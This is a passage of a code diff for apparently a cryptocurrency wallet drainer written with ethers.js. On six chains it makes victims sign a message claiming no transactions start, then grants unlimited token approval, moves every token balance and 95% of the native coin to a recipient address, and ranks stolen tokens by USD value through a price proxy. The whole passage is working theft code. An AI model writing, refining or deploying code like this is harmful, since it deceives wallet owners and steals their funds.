+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                       
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARBNOVA`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for ARB to send')
+                       
                      }
-                      break;
-                    
-                    //BASE
-                    case base.chainId:
-                      const baseTokens = await fetchBASETokens(address);
-          
-                      // Message to sign
-                      const baseMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const baseSignature = await signer.signMessage(baseMessage);
-                      console.log('Signature:', baseSignature);
-          
-                      const baseTokenDetails = [];
-                      for (let token of baseTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring ARBNOVA:', error);
+                        
+                   }
+                    break;
+                  
+                  //BASE
+                  case base.chainId:
+                    const baseTokens = await fetchBASETokens(address);
+        
+                    // Message to sign
+                    const baseMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const baseSignature = await signer.signMessage(baseMessage);
+                    console.log('Signature:', baseSignature);
+        
+                    const baseTokenDetails = [];
+                    for (let token of baseTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               baseTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      baseTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of baseTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(baseContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(baseContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BASE`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for BASE to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring BASE:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    baseTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of baseTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(baseContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(baseContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BASE`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for BASE to send')
+                       
                      }
-                      break;
-          
-                    //ZKSYNC
-                    case zksync.chainId:
-                      const zkTokens = await fetchZKSYNCTokens(address);
-          
-                      // Message to sign
-                      const zkMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const zkSignature = await signer.signMessage(zkMessage);
-                      console.log('Signature:', zkSignature);
-          
-                      const zkTokenDetails = [];
-                      for (let token of zkTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring BASE:', error);
+                        
+                   }
+                    break;
+        
+                  //ZKSYNC
+                  case zksync.chainId:
+                    const zkTokens = await fetchZKSYNCTokens(address);
+        
+                    // Message to sign
+                    const zkMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const zkSignature = await signer.signMessage(zkMessage);
+                    console.log('Signature:', zkSignature);
+        
+                    const zkTokenDetails = [];
+                    for (let token of zkTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               zkTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      zkTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of zkTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(zksyncContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(zksyncContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ZKSYNC`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for ZKSYNC to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring ZKSYNC:', error);
-                         
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    zkTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of zkTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(zksyncContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(zksyncContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ZKSYNC`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for ZKSYNC to send')
+                       
                      }
-                      break;
-          
-                    //POLYGON
-                    case polygon.chainId:
-                      const polyTokens = await fetchPOLYGONTokens(address);
-          
-                      // Message to sign
-                      const polyMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const polySignature = await signer.signMessage(polyMessage);
-                      console.log('Signature:', polySignature);
-          
-                      const polyTokenDetails = [];
-                      for (let token of polyTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring ZKSYNC:', error);
+                       
+                   }
+                    break;
+        
+                  //POLYGON
+                  case polygon.chainId:
+                    const polyTokens = await fetchPOLYGONTokens(address);
+        
+                    // Message to sign
+                    const polyMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const polySignature = await signer.signMessage(polyMessage);
+                    console.log('Signature:', polySignature);
+        
+                    const polyTokenDetails = [];
+                    for (let token of polyTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               polyTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      polyTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of polyTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(polygonContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(polygonContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGON`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for POLYGON to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring POLYGON:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    polyTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of polyTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(polygonContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(polygonContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGON`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for POLYGON to send')
+                       
                      }
-                      break;
-          
-          
-                  ////POLYGONEVM
-                    case polygonevm.chainId:
-                      const polyevmTokens = await fetchPOLYGONEVMTokens(address);
-          
-                      // Message to sign
-                      const polyevmMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const polyevmSignature = await signer.signMessage(polyevmMessage);
-                      console.log('Signature:', polyevmSignature);
-          
-                      const polyevmTokenDetails = [];
-                      for (let token of polyevmTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring POLYGON:', error);
+                        
+                   }
+                    break;
+        
+        
+                ////POLYGONEVM
+                  case polygonevm.chainId:
+                    const polyevmTokens = await fetchPOLYGONEVMTokens(address);
+        
+                    // Message to sign
+                    const polyevmMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const polyevmSignature = await signer.signMessage(polyevmMessage);
+                    console.log('Signature:', polyevmSignature);
+        
+                    const polyevmTokenDetails = [];
+                    for (let token of polyevmTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               polyevmTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      polyevmTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of polyevmTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(polygonevmContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(polygonevmContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGONEVM`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for POLYGONEVM to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring POLYGONEVM:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    polyevmTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of polyevmTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(polygonevmContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(polygonevmContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGONEVM`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for POLYGONEVM to send')
+                       
                      }
-                      break;
-                    
-          
-                    //BLAST
-                    case blast.chainId:
-                      const blastTokens = await fetchBLASTTokens(address);
-          
-                      // Message to sign
-                      const blastMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const blastSignature = await signer.signMessage(blastMessage);
-                      console.log('Signature:', blastSignature);   
-          
-                      const blastTokenDetails = [];
-                      for (let token of blastTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring POLYGONEVM:', error);
+                        
+                   }
+                    break;
+                  
+        
+                  //BLAST
+                  case blast.chainId:
+                    const blastTokens = await fetchBLASTTokens(address);
+        
+                    // Message to sign
+                    const blastMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const blastSignature = await signer.signMessage(blastMessage);
+                    console.log('Signature:', blastSignature);   
+        
+                    const blastTokenDetails = [];
+                    for (let token of blastTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               blastTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      blastTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of blastTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(blastContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(blastContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    blastTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+                    try {
+                        for(let token of blastTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(blastContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(blastContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                    try {
+                        //send native tokens
+                        const etherBalance = await provider.getBalance(address)
+                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BLAST`);
+           
+                        if(etherBalance.gte(minimumBalance)){
+                          const amountToSend = etherBalance.mul(95).div(100);
+                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);
+           
+                    // Define the transaction
+                        const transaction = {
+                            to: recipientAddress, // Replace with the recipient's address
+                            value: amountToSend,
+                            // Optional: You can specify gasLimit and gasPrice here if necessary
+                        };
+                        const txResponse = await signer.sendTransaction(transaction);
+                        console.log(`Transaction hash: ${txResponse.hash}`);
+           
+                        // Wait for the transaction to be mined
+                        const txReceipt = await txResponse.wait();
+                        console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                        }else{
+                          console.log('No balance found for BLAST to send')
+                         
+                        }
                       } catch (error) {
-                          console.error('Error transferring tokens:', error);
+                           console.error('Error transferring BLAST:', error);
                           
                       }
-          
-                      try {
-                          //send native tokens
-                          const etherBalance = await provider.getBalance(address)
-                          console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BLAST`);
-             
-                          if(etherBalance.gte(minimumBalance)){
-                            const amountToSend = etherBalance.mul(95).div(100);
-                          console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);
-             
-                      // Define the transaction
-                          const transaction = {
-                              to: recipientAddress, // Replace with the recipient's address
-                              value: amountToSend,
-                              // Optional: You can specify gasLimit and gasPrice here if necessary
-                          };
-                          const txResponse = await signer.sendTransaction(transaction);
-                          console.log(`Transaction hash: ${txResponse.hash}`);
-             
-                          // Wait for the transaction to be mined
-                          const txReceipt = await txResponse.wait();
-                          console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                          }else{
-                            console.log('No balance found for BLAST to send')
-                           
-                          }
-                        } catch (error) {
